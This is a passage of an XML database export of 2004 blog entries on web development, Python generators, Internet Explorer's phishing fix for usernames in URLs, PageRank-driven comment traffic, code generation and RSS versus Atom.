&lt;p&gt;Comment spam is a solvable problem. Furthermore, blogging about comment spamming is almost as dull as blogging about blogging. Let's hurry up and solve it so we can go back to blogging about &lt;a href=&quot;http://www.feedster.com/search.php?q=blogging+about+cats&quot;&gt;cats&lt;/a&gt;.&lt;/p&gt;

</field>
		<field name="created">2004-01-28 03:24:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1340</field>
		<field name="title">Iterating over a sequence in reverse</field>
		<field name="slug">sequenceInReverse</field>
		<field name="body">&lt;p&gt;At work today we stumbled across a situation where we needed to display a list of items in reverse order. The decision to show them in reverse is made in the presentation layer, so altering the code that generates the list in the application logic layer would add coupling between the layers that we would rather avoid. Python's reverse() function acts on a data structure in place, which we would rather avoid as well. Then we realised that Python's generators could be used to create a proxy around the sequence allowing us to cycle through it in reverse without altering the sequence itself. Here's the code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;class ReverseIteratorProxy:
    def __init__(self, sequence):
        self.sequence = sequence
    def __iter__(self):
        length = len(self.sequence)
        i = length
        while i &amp;gt; 0:
            i = i - 1
            yield self.sequence[i]

&amp;gt;&amp;gt;&amp;gt; l = range(10)
&amp;gt;&amp;gt;&amp;gt; l
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
&amp;gt;&amp;gt;&amp;gt; for i in ReverseIteratorProxy(l):
...     print i,
... 
9 8 7 6 5 4 3 2 1 0
&amp;gt;&amp;gt;&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was going to explain how the above code works, but after several false starts I realised that explaining generators is best &lt;a href=&quot;http://www-106.ibm.com/developerworks/linux/library/l-pycon?t=grl,l=252,p=iterators&quot; title=&quot;Charming Python: Iterators and simple generators&quot;&gt;left to the experts&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Unsurprisingly, this isn't exactly a new idea. &lt;a href=&quot;http://www.python.org/peps/pep-0322.html&quot; title=&quot;Reverse Iteration&quot;&gt;PEP 322&lt;/a&gt; covers reverse iteration, and the Python Tutorial uses it to illustrate both &lt;a href=&quot;http://www.python.org/doc/current/tut/node11.html#SECTION0011900000000000000000&quot; title=&quot; 9.9 Iterators&quot;&gt;iterators&lt;/a&gt; and &lt;a href=&quot;http://www.python.org/doc/current/tut/node11.html#SECTION00111000000000000000000&quot; title=&quot; 9.10 Generators&quot;&gt;generators&lt;/a&gt;. Aah well.&lt;/p&gt;</field>
		<field name="created">2004-01-28 03:58:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1341</field>
		<field name="title">Cold War check point</field>
		<field name="slug">coldWar</field>
		<field name="body">&lt;blockquote cite=&quot;http://www.7nights.com/asterisk/archives/flash_your_take.php#comments&quot;&gt;&lt;p&gt;
One main reason I detest 100% Flash-based sites so much is because they don't promote sharing and linking which are two big things to do on the Web. See a cool new game screenshot that you want to show your friend? Sorry, no can do with that 100% Flash-based site because everything is contained under one URL which is like a Cold War check point for the entire site.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Nollind Whachell in a &lt;a href=&quot;http://www.7nights.com/asterisk/archives/flash_your_take.php#comments&quot; title=&quot;Flash -- Your Take&quot;&gt;discussion on Asterisk*&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-01-29 01:08:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1342</field>
		<field name="title">No more usernames in URLs</field>
		<field name="slug">noMoreUsernames</field>
		<field name="body">&lt;p&gt;This one could get very interesting. Microsoft have &lt;a href=&quot;http://support.microsoft.com/default.aspx?scid=kb;%5bLN%5d;834489&quot; title=&quot;Microsoft plans to release a software update that modifies the default behavior of Internet Explorer for handling user information in HTTP and HTTPS URLs&quot;&gt;announced&lt;/a&gt; that an upcoming update to Internet Explorer will remove the ability to include usernames in &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s completely. This is in response to the growing problem of so called &quot;phishing&quot; scams, which use trick &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s to con important information such as passwords and credit card details out of unsuspecting browser users.&lt;/p&gt;

&lt;p&gt;Phishing is &lt;em&gt;big&lt;/em&gt; business. In &lt;a href=&quot;http://www.securityfocus.com/cgi-bin/sfonline/columnists-item.pl?id=215&quot; title=&quot;A Visit from the FBI&quot;&gt;this article on SecurityFocus&lt;/a&gt;, a loose transcript is provided of a talk by an &lt;acronym title=&quot;Federal Bureau of Investigation&quot;&gt;FBI&lt;/acronym&gt; agent who explains how phishing is used by organised crime gangs in Eastern Europe:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.securityfocus.com/cgi-bin/sfonline/columnists-item.pl?id=215&quot;&gt;&lt;p&gt; This is bad enough and it's also cruelly funny, but the scary part came in when Dave started talking about the other group behind the explosion of viruses and Trojans: Eastern European hackers, backed by organized crime, such as the Russian mafia. In other words, the professionals.&lt;/p&gt;

&lt;p&gt;These people are after one thing: money. The easiest way to illegally acquire money now is through the use of online tools like Trojans, or through phishing: set up a fake Web site for PayPal or eBay or Amazon, and then convince the naive to enter their usernames, passwords, and credit card information. Viruses and spam also intersect in this nasty spiderweb. Viruses help spread Trojans, and Trojans are used to turn unsuspecting users' computers into spam factories, or hosts for phishing expeditions, and thus furthering the spread of all the elements in this process: viruses, Trojans, spam, and phishing. It's a vicious cycle, and unfortunately, it appears to be getting worse. The FBI is working as hard as it can, but the nations of Eastern Europe are somewhat powerless to solve the problem at this time. &lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; is so susceptible to this kind of attack that it's not even funny. In addition to the &quot;invisible username&quot; bug I &lt;a href=&quot;http://simon.incutio.com/archive/2003/12/09/nastyBug&quot; title=&quot;Nasty new IE vulnerability&quot;&gt;covered last month&lt;/a&gt;, a recent discovery compounds the problem by allowing dangerous executable files to pose as safe file types when downloaded from the web. &lt;a href=&quot;http://www.infoworld.com/article/04/01/28/HNiehole_1.html&quot;&gt;New Explorer hole could be devastating&lt;/a&gt; has the full details.&lt;/p&gt;

&lt;p&gt;Microsoft's solution is drastic to say the least. Passing the username as part of a &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; has been part of the makeup of the internet since at least 1994, and the ability is baked in to a huge range of web client and server software. It's described in &lt;a href=&quot;http://www.ietf.org/rfc/rfc2396.txt&quot;&gt;RFC 23996&lt;/a&gt;.  The feature is rarely used however, and the overall effect of its removal from &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; is hard to judge. Off the top of my head I can think of only one site that uses it for legitimate reasons: &lt;a href=&quot;http://www.fileplanet.com/&quot;&gt;FilePlanet&lt;/a&gt;, which incorporates it in to the site's download queuing system (at least last time I checked).&lt;/p&gt;

&lt;p&gt;There's an interesting contrast to be made here between open and closed development methodologies. The Mozilla project has had &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=122445&quot; title=&quot;Bug 122445: Spoof prevention: Warn if username/password in link (url) looks like a hostname&quot;&gt;a bug open on this issue&lt;/a&gt; for over two years, which has drawn over 170 comments with plenty of great ideas but no approved solution. Microsoft on the other hand have remained silent on the issue until (we can only assume) the bad publicity surrounding it forced them to act, at which point they announced a fix that appears to gly in the face of commonly accepted web standards - but does undoubtedly solve the problem. Of course, with no chance for user feedback prior to the decision it amounts to little less than a decree from God - which correlates directly to their inarguable domination of the browser market, at least in terms of market share.&lt;/p&gt; 

&lt;p&gt;Of course, the millions of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; users who decline to upgrade their browser will remain just as susceptible as they always were (unless they &lt;a href=&quot;http://support.microsoft.com/default.aspx?scid=kb;[ln];833786&quot; title=&quot;Steps that you can take to help identify and to help protect yourself from deceptive (spoofed) Web sites and malicious hyperlinks&quot;&gt;stop clicking links&lt;/a&gt;) - a fact for which we can hardly blame Microsoft. It does however mean that phishing will remain a lucrative scam for a long time to come.&lt;/p&gt;
</field>
		<field name="created">2004-01-30 08:14:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1343</field>
		<field name="title">I've sold out!</field>
		<field name="slug">sellingOut</field>
		<field name="body">&lt;p&gt;What can I say - the lure of the mighty dollar proved too much. I've just made my first post to &lt;a href=&quot;http://www.sitepoint.com/blog-view.php?blogid=5&quot; title=&quot;Stylish Scripting&quot;&gt;my new client-side scripting blog&lt;/a&gt; over at &lt;a href=&quot;http://www.sitepoint.com/&quot;&gt;SitePoint&lt;/a&gt;, as a paid columnist.&lt;/p&gt;

&lt;p&gt;I'll answer the most obvious question straight away: I'm not going to stop writing here. My SitePoint blog is a subject-focused blog covering client-side web development - CSS, Javascript, HTML and their role in modern web site creation. This blog will continue to host my thoughts on other subjects - mainly server-side stuff, but also general programming, web related rants and anything else that strikes my interest. Oh, and bashing Microsoft, naturally ;)&lt;/p&gt;

&lt;p&gt;I'm a big fan of strictly subject-driven blogs, so it's going to be fun working on one right from the start. &lt;a href=&quot;http://lambda.weblogs.com/&quot;&gt;Lambda the Ultimate&lt;/a&gt; (programming languages), &lt;a href=&quot;http://www.steptwo.com.au/columntwo/&quot;&gt;Column Two&lt;/a&gt; (content and knowledge management), the &lt;a href=&quot;http://www.pythonware.com/daily/&quot;&gt;Daily Python-URL&lt;/a&gt; and Adrian Holovaty's &lt;a href=&quot;http://www.holovaty.com/&quot; title=&quot;Adrian Holovaty&quot;&gt;online journalism blog&lt;/a&gt; are all great examples of blogs with a topical focus, and I hope to take my SitePoint blog in a similarly focused direction.&lt;/p&gt;

&lt;p&gt;Incidentally, the blogging system at SitePoint has only just been launched and evidently there are still some issues to iron out. I &lt;em&gt;know&lt;/em&gt; the site doesn't validate, and I hope to work with SitePoint to resolve some of the other markup and Javascript issues I've spotted. I hope to write up some of the problems and solutions on the blog itself in coming weeks.&lt;/p&gt;</field>
		<field name="created">2004-02-04 05:54:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1344</field>
		<field name="title">The return of the Spong Monkeys</field>
		<field name="slug">spongMonkeys</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/200402.html#d03&quot; title=&quot;Love, Feline Style&quot;&gt;Eric Meyer&lt;/a&gt;, at least I'm not the only one selling out. Joel Veitch's infamous &lt;a href=&quot;http://www.rathergood.com/moon_song/&quot;&gt;Spong Monkeys&lt;/a&gt; can now be seen in two TV ads for Quiznos sandwhiches: &lt;a href=&quot;http://www.quiznos.com/images/WeLoveTheSubs.mov&quot;&gt;We love the subs&lt;/a&gt; and &lt;a href=&quot;http://www.quiznos.com/images/Coupon.mov&quot;&gt;Take a buck off&lt;/a&gt; (Quicktime movies). It's nice to see such awesome and uniquely British talent recognised at a global level.&lt;/p&gt;</field>
		<field name="created">2004-02-04 06:12:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1345</field>
		<field name="title">Command line Futurama quotes</field>
		<field name="slug">futurama</field>
		<field name="body">&lt;p&gt;Today's command line amusement:&lt;/p&gt;

&lt;p&gt;&lt;samp&gt;lynx -mime_header http://slashdot.org/ | head -n 6 | tail -1&lt;/samp&gt;&lt;/p&gt;</field>
		<field name="created">2004-02-05 23:14:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1346</field>
		<field name="title">Hot Links</field>
		<field name="slug">hotLinks</field>
		<field name="body">&lt;p&gt;The thing I love about &lt;acronym title=&quot;R... S... Syndication&quot;&gt;RSS&lt;/acronym&gt;, and by extension web services, is that they allow people to take publically available data and combine it in ways never thought of by the originator of the feed. The internet is awash with examples of this, from useful services such as &lt;a href=&quot;http://www.feedster.com/&quot;&gt;Feedster&lt;/a&gt; to useless amusements like &lt;a href=&quot;http://www.chthonicionic.net/bile/&quot;&gt;I despise you and your so-called taste&lt;/a&gt;, the most insulting extension of the Amazon &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; I've seen to date.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://dev.upian.com/hotlinks/&quot;&gt;Hot Links&lt;/a&gt; is the neatest new serice of this kind I've seen in quite a while, spotted a few weeks ago thanks to a vanity &lt;a href=&quot;http://weblogs.pubsub.com/&quot;&gt;PubSub&lt;/a&gt; subscription. Hot Links subscribes to a bunch of &lt;acronym title=&quot;R... S... Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds for link logs (or blogmarks or whatever you want to call them) and watches them for newly linked sites. When it spots one, it grabs a thumbnail sized screenshot using &lt;a href=&quot;http://www.babysimon.co.uk/khtml2png/&quot;&gt;khtml2png&lt;/a&gt; and posts it along with the description cribbed from the link log. Sites linked to from more than one link roll are promoted, allowing Hot Links visitors to restrict their &quot;level&quot; and view only sites with a certain minimum number of citations.&lt;/p&gt;

&lt;p&gt;Syndicating link logs like this is a smart idea, and the people behind Hot Links have pulled it off in a stylish manner with great attention to detail. I particularly like the ability to view &lt;a href=&quot;http://dev.upian.com/hotlinks/?f=9&quot;&gt;links from just my blogmarks&lt;/a&gt; as it provides a neat visual reminder of the sites I've recently recorded.&lt;/p&gt;</field>
		<field name="created">2004-02-05 23:53:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1347</field>
		<field name="title">The dangers of PageRank</field>
		<field name="slug">dangers</field>
		<field name="body">&lt;p&gt;A well documented side effect of the weblog format is that it brings Google PageRank in almost absurd quantities. I'm now the 5th result for &lt;a href=&quot;http://www.google.com/search?q=simon&quot; title=&quot;Google Search: simon&quot;&gt;simon&lt;/a&gt; on Google, and I've been the top result for &lt;a href=&quot;http://www.google.com/search?q=simon+willison&quot;&gt;simon willison&lt;/a&gt; almost since the day I launched. High rankings however are not always a good thing, especially when combined with a comment system. A growing number of bloggers have found themselves at the top position for terms of little or no relevance to the rest of their sites, which in turn can attract truly surreal comments from visitors from search engines who may never have encountered a blog before.&lt;/p&gt;

&lt;p&gt;I know of a couple of entries on my own blog that are attracting this kind of traffic. The most interesting is probably &lt;a href=&quot;http://simon.incutio.com/archive/2003/08/13/artificialDiamonds&quot;&gt;this entry&lt;/a&gt; on &lt;a href=&quot;http://www.google.com/search?q=artificial+diamonds&quot; title=&quot;Google Search: artificial diamonds&quot;&gt;artifical diamonds&lt;/a&gt;, which has attracted comments from both buyers and sellers of artificial gems. My &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/09/badInterfaceDesignFromMicrosof&quot;&gt;entry&lt;/a&gt; on MSN messenger usability problems from 2002 has drawn a steady stream of hilarious comments, no doubt caused in part by its top rating on Google for &lt;a href=&quot;http://www.google.com/search?msn+messenger+sucks&quot; title=&quot;Google Search: msn messenger sucks&quot;&gt;msn messenger sucks&lt;/a&gt;. Amusingly, for a long time &lt;a href=&quot;http://search.msn.com/&quot;&gt;Microsoft's own search engine&lt;/a&gt; was giving my page a high rank for a wide variety of less negative messenger related terms.&lt;/p&gt;

&lt;p&gt;My own experiences of this phenomenon pale in to significance to some of the others I've seen. The most impressive example has to be Jason Kottke's &lt;a href=&quot;http://www.kottke.org/03/05/the-matrix-reloaded&quot;&gt;brief review&lt;/a&gt; of the Matrix Reloaded, which drew over 900 comments from Google strays, developed its own micro-community and resulted in Jason pondering &lt;a href=&quot;http://www.kottke.org/03/06/own-conversation&quot;&gt;who owns the conversation on my web site?&lt;/a&gt; Jason eventually deciding to close and archive the thread after the page grew to more than a megabyte in size.&lt;/p&gt;

&lt;p&gt;The problem can take on a far more disturbing twist. I won't link directly to these entries for fear of adding to their predicaments, but searches for &lt;a href=&quot;http://www.google.com/search?q=crime+scene+cleanup&quot; title=&quot;Google Search: crime scene cleanup&quot;&gt;crime scene cleanup&lt;/a&gt; and &lt;a href=&quot;http://www.google.com/search?q=suicide+chat+rooms&quot; title=&quot;Google Search: suicide chat rooms&quot;&gt;suicide chat rooms&lt;/a&gt; both return blogs in the first two results. The former thread is mostly crime scene cleanup companies marketing their services, but the latter is quite frankly disturbing. It's certainly lead me to double check the titles of my entries before posting them.&lt;/p&gt;

&lt;p&gt;Thankfully, avoiding this kind of unwanted comment traffic is pretty simple. One way is to simply disable comments for entries older than a certain time (generally a couple of weeks), although personally I like to see the occasional comment on old entries. A neater solution proposed by Russell Beattie last year is to simply &lt;a href=&quot;http://www.beattie.info/notebook/1003990.html&quot; title=&quot;Googler Comments&quot;&gt;hide comments from search engine referrals&lt;/a&gt;, thus ensuring that random strays won't leave their mark without understanding the nature of your site first.&lt;/p&gt;</field>
		<field name="created">2004-02-06 16:58:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1348</field>
		<field name="title">width = str(len(str(len(lines))))</field>
		<field name="slug">strlenstrlen</field>
		<field name="body">&lt;p&gt;The above monstrosity came up today while writing a function to add zero padded line numbers to a chunk of text:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def linenumbers(text):
    &quot;Add zero padded line numbers to text&quot;
    lines = text.split('\n')
    # Find the maximum 'width' of the line count
    width = str(len(str(len(lines))))
    for i, line in enumerate(lines):
        lines[i] = (&quot;%0&quot; + width  + &quot;d. %s&quot;) % (i + 1, line)
    return '\n'.join(lines)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I think it has a pleasant kind of symmetry to it.&lt;/p&gt;</field>
		<field name="created">2004-02-10 01:44:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1349</field>
		<field name="title">Code generation vs data driven programming</field>
		<field name="slug">codeGeneration</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.nedbatchelder.com/blog/200402.html#e20040210T222100&quot; title=&quot;Code generation with Cog&quot;&gt;Ned Batchelder&lt;/a&gt;, this &lt;a href=&quot;http://www.codegeneration.net/tiki-read_article.php?articleId=9&quot;&gt;interview with pragmatic Dave Thomas&lt;/a&gt; on code generation closely reflects my own nascent thoughts on the issue:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.codegeneration.net/tiki-read_article.php?articleId=9&quot;&gt;&lt;p&gt;&lt;strong&gt;CGN:&lt;/strong&gt; What do think the future is for code generation?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dave:&lt;/strong&gt; I think that in the long term the larger code generation efforts, the &quot;application generators,&quot; will become a thing of the past. They are there because the underlying technologies and architectures don't yet support programming at a high level.  But I'm betting that languages such as Java and C++ will in the long term be seen as a curious branch in the evolution of computing. I'm hoping that somewhere out there some bright spark is coming up with a way of letting us write applications expressively and dynamically. Once this happens, the need for these kinds of code generators will diminish.&lt;/p&gt;

&lt;p&gt;For example, I rarely (if ever) write a code generator that generates Ruby code: there's just no need, as Ruby is dynamic enough to let be do what I want without leaving the language.&lt;/p&gt;

&lt;p&gt;In the shorter term, though, I think code generators of all kinds will continue to contribute significantly to the industry. Java and C# are both such stifling languages that you need to be able to use code generators to make them effective.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We considered using code generators for our current major project at work, and picked up Jack Herrington's &lt;a href=&quot;http://www.codegeneration.net/cgia/&quot; title=&quot;Code Generation in Action&quot;&gt;book&lt;/a&gt; on the subject. Reading through it, it became clear that many of the problems that code generators solve can be tackled instead using &lt;a href=&quot;http://simon.incutio.com/archive/2003/12/05/dataDriven&quot; title=&quot;How not to use OOP&quot;&gt;data driven programming techniques&lt;/a&gt; made possible by dynamic languages. Since we had already settled on Python as our implementation language the need for code generation became far less apparent, and we ended up avoiding it entirely with the exception of a command line tool for passvely generating basic templates for our admin interface.&lt;/p&gt;

&lt;p&gt;If I ever have to work with a less expressive language I'll certainly consider using a code generator (probably written in Python) to abstract away some some of the tedious repetition. As it is, Python's rich data structures and clean support for introspection provide an excellent alternative.&lt;/p&gt;</field>
		<field name="created">2004-02-11 05:39:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1350</field>
		<field name="title">RSS vs Atom, condensed</field>
		<field name="slug">itsJustData</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/001585.html&quot; title=&quot;My Yahoo and Atom&quot;&gt;Jeremy Zawodny&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://jeremy.zawodny.com/blog/archives/001585.html&quot;&gt;&lt;p&gt;Since everyone's jumping up and down about the Atom vs. RSS (or &quot;Google vs. RSS&quot; if that's your paranoia) debate, it's probably worth pointing out that My Yahoo's RSS module also groks Atom. It was added last night. It took about a half hour.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;To &lt;a href=&quot;http://www.intertwingly.net/blog/&quot; title=&quot;from Sam Ruby&quot;&gt;borrow&lt;/a&gt; a phrase, &lt;em&gt;it's just data&lt;/em&gt;.&lt;/p&gt;</field>
		<field name="created">2004-02-12 20:31:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1351</field>
		<field name="title">Automatic line ending conversions in IE</field>
		<field name="slug">lineEndings</field>
		<field name="body">&lt;p&gt;I've just updated my SitePoint blog with a &lt;a href=&quot;http://www.sitepoint.com/blog-post-view.php?id=153450&quot; title=&quot;Line endings in Javascript&quot;&gt;tale of Javascript debugging woe&lt;/a&gt;. To cut a long story short, Internet Explorer for both Mac and Windows automatically converts sane line endings in to the platform specific alternatives whenever you assign a Javascript string to the value attribute of a text area. It's the kind of quirk that can take up a whole morning's worth of debugging.&lt;/p&gt;</field>
		<field name="created">2004-02-17 02:03:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1352</field>
		<field name="title">Hacking the political system</field>
		<field name="slug">hackingPolitics</field>
		<field name="body">&lt;p&gt;Danny O'Brien has a &lt;a href=&quot;http://www.oblomovka.com/entries/2004/02/15#1076885280&quot; title=&quot;hacking, gaming and politics&quot;&gt;fascinating post&lt;/a&gt; up about the nature of hacking and how to game entrenched political systems. It's all worth reading, but the part about how &lt;a href=&quot;http://www.faxyourmp.com/&quot;&gt;Fax Your MP&lt;/a&gt; was created as a deliberate political hack in particular caught my attention. I've long been a fan of Fax Your MP and it's really interesting to see some of the ideas behind the system explained:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.oblomovka.com/entries/2004/02/15#1076885280&quot;&gt;
&lt;p&gt;We crafted FYMP explicitly as a hack on the political system. It's aesthetics and techniques are drawn directly from the hacking tradition (in the sense of the Jargon File, not the sense of the computer cracker of course).
FaxYourMP provides something which some (by no means all, but some) MPs really don't want - a low-cost way of hassling your elected representative.&lt;/p&gt;

&lt;p&gt;It's really hard to object to this, because the rules of the game state that MPs represent their constituents. Over time, other forces - party political and the media mainly - have bypassed those rules so that some MPs do very little constituent tending. This is a gaming that has been very hard to stop. Bad MPs have a lot of excellent techniques for avoiding their constituents. Some are just inaccessible. Some have a great excuse that they try to meet with their constituents, but those apathetic buggers simply refuse to turn up to the surgeries.&lt;/p&gt;

[...]

&lt;p&gt;By setting up the fax gateway - a dirt cheap tech fix, we took those excuses away, and didn't provide any new ones. We tried to rig the forces that broke the MP/constituent link to work for us. When a fax machine doesn't work, it's not us that has to fix it. It's the whip's office, who need to keep in touch with their MP. When MPs don't reply to faxes, we don't do anything. We just alter the public statistics, which the press read and respond to.&lt;/p&gt;

&lt;p&gt;But best of all, it's really hard for people to complain about our existence, because we're working within the rules of the game. In fact, people now think we're *part* of the rules of the game. A sizeable minority of people using FYMP think we're a government service, and get angry at us when they're MP doesn't reply.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2004-02-17 02:15:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1353</field>
		<field name="title">End user license agreements hit a new low</field>
		<field name="slug">eulas</field>
		<field name="body">&lt;p&gt;So &lt;a href=&quot;http://www.wired.com/news/infostructure/0,1377,62251,00.html?tw=wn_techhead_9&quot; title=&quot;Adware Spreads Quickly on AOL IM&quot;&gt;apparently&lt;/a&gt; there's an unpleasant worm going around AOL Instant Messenger at the moment. Only it's not a worm - it's a semi-legitimate piece of adware which asks you for permission to &quot;modify the instant messenger software, deliver additional content such as advertisements and promotional messages&quot; and announces that &quot;In addition, the software will interoperate with your current instant messaging client so as to permit the automatic sending of advertising messages originating from your computer to your contact or 'buddy' list regarding content offered by PSD Tools or its suppliers.&quot;&lt;/p&gt;

&lt;p&gt;In other words, it spams itself to everyone on your buddy list. Naturally, since no one &lt;em&gt;ever&lt;/em&gt; reads the terms and conditions on those things it's spreading like wildfire.&lt;/p&gt;
</field>
		<field name="created">2004-02-17 02:32:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1354</field>
		<field name="title">Advanced Python network programming</field>
		<field name="slug">advanced</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/python/2004/02/12/advanced_nio.html?page=1&quot;&gt;Understanding Network I/O, Part 2&lt;/a&gt; by George Belotsky (via &lt;a href=&quot;http://dev.r.tucows.com/blog/_archives/2004/2/17/20915.html&quot; title=&quot;Return of a great Python network programming tutorial&quot;&gt;The Farm&lt;/a&gt;) is the best tutorial on the subject of network programming I've seen yet. It provides a detailed explanation of simple threaded network clients, thread pools using the Queue module and asynchronous I/O using both Twisted and Python's asyncore library - then discusses the strengths and weaknesses of each approach.&lt;/p&gt;

&lt;p&gt;I've also just noticed that O'Reilly &lt;a href=&quot;http://www.oreillynet.com/pub/au/1204&quot; title=&quot;O&amp;apos;Reilly Network: George Belotsky&quot;&gt;provide RSS 1.0 and Atom feeds&lt;/a&gt; for each of their authors. Neat.&lt;/p&gt;</field>
		<field name="created">2004-02-18 03:36:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1355</field>
		<field name="title">Catching up with Harry</field>
		<field name="slug">harry</field>
		<field name="body">&lt;p&gt;I'm not sure how I missed this, but Harry Fueck's new book &lt;a href=&quot;http://www.sitepoint.com/books/phpant1/&quot;&gt;The PHP Anthology&lt;/a&gt; was published by SitePoint back in December, as a hefty 2 volume epic. Harry is the guru behind &lt;a href=&quot;http://www.phppatterns.com/&quot;&gt;PHP Patterns&lt;/a&gt; and &lt;em&gt;really&lt;/em&gt; knows his stuff. While the book is at first glance a cookbook for solving web related problems, Harry also uses it as &lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/101/1/11/&quot; title=&quot;The PHP Anthology and more blogging&quot;&gt;a platform for teaching sensible development practises&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://phppatterns.com/index.php/article/articleview/101/1/11/&quot;&gt;
&lt;p&gt;Between the lines I've focused on teaching OOP by example, partly by developing classes in the book and also by taking advantage of Open Source class libraries I'm familiar with; in most cases projects from PEAR.&lt;/p&gt;

&lt;p&gt;That's also where I'd say The PHP Anthology is unique, in it aims to get readers to avoid re-inventing wheels already done many times in PHP. Although many of the subjects have been seen before (often online), the focus here is either to use an Open Source class library or put one together, solving a problem once and for all, as opposed a hacked script that goes half way.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Sample chapters from the books are available online, including an &lt;a href=&quot;http://www.sitepoint.com/article/php-anthology-2-5-caching/&quot; title=&quot;The PHP Anthology Volume 2, Chapter 5 - Caching&quot;&gt;excellent explanation of caching techniques&lt;/a&gt;. Harry is also one of my co-bloggers over at SitePoint where he writes about (you guessed it) &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; in &lt;a href=&quot;http://www.sitepoint.com/blog-view.php?blogid=9&quot; title=&quot;PHP Blog: Dynamically Typed&quot;&gt;Dynamically Typed&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-02-18 03:56:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1356</field>
		<field name="title">If foxes can learn Ruby, why can't you?</field>
		<field name="slug">foxes</field>
		<field name="body">&lt;p&gt;Why The Lucky Stiff's &lt;a href=&quot;http://poignantguide.net/ruby/&quot;&gt;(poignant) guide to Ruby&lt;/a&gt; is shaping up to be a masterpiece. Trust me, you've never read a programming language guide that's even remotely comparable. Even if you have no interest in Ruby you should check it out, if only for the cartoon foxes. Here's Why's &lt;a href=&quot;http://poignantguide.net/ruby/chapter-3.html#section2&quot; title=&quot;The Parts of Speech&quot;&gt;explanation&lt;/a&gt; of Ruby's array syntax:&lt;/p&gt;

&lt;blockquote cite=&quot;http://poignantguide.net/ruby/chapter-3.html#section2&quot;&gt;
&lt;p&gt;An array is a list surrounded by square brackets and separated by commas.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;    [1, 2, 3]&lt;/code&gt; is an array of numbers.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;    ['coat', 'mittens', 'snowboard']&lt;/code&gt; is an array of strings.&lt;/p&gt;

&lt;p&gt;Think of it as a caterpillar which has been stapled into your code. The two square brackets are staples which keep the caterpillar from moving, so you can keep track of which end is the head and which is the tail. The commas are the caterpillar's legs, wiggling between each section of its body.&lt;/p&gt;

&lt;p&gt;Once there was a caterpillar who had commas for legs. Which meant he had to allow a literary pause after each step. The other caterpillars really respected him for it and he came to have quite a commanding presence. Oh, and talk about a philanthropist! He was notorious for giving fresh leaves to those less-fortunate.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The foxes say it best:&lt;/p&gt;

&lt;p&gt;&lt;img height=&quot;229&quot; src=&quot;http://simon.incutio.com/images/2004/foxes.gif&quot; title=&quot;Cartoon foxes comment on Why&amp;apos;s sanity&quot; width=&quot;795&quot; /&gt;&lt;/p&gt;</field>
		<field name="created">2004-02-20 01:31:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1357</field>
		<field name="title">Recommendations for a cheap US dial-up provider?</field>
